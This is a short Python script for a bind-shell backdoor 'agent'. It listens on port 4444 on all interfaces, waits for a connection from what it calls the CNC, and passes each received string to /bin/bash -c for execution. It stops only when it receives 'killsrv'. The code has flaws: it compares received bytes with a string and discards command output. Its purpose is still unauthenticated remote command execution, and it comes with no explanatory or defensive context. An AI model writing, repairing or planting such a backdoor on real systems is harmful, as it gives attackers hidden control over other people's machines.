import socket
import subprocess
import sys


socksize = 1024

host = '0.0.0.0'
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
print("Agent started on port: {}\nWaiting for connections from CNC...\n".format(port))
conn, addr = server.accept()

while True:
    print('New connection from {}:{}'.format(addr[0], addr[1]))
    data = conn.recv(socksize)
    if not data:
        continue
    elif data == 'killsrv':
        break
    else:
        cmd = ['/bin/bash', '-c', data]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE)
        stdout, stderr = proc.communicate()

server.close()
sys.exit(0)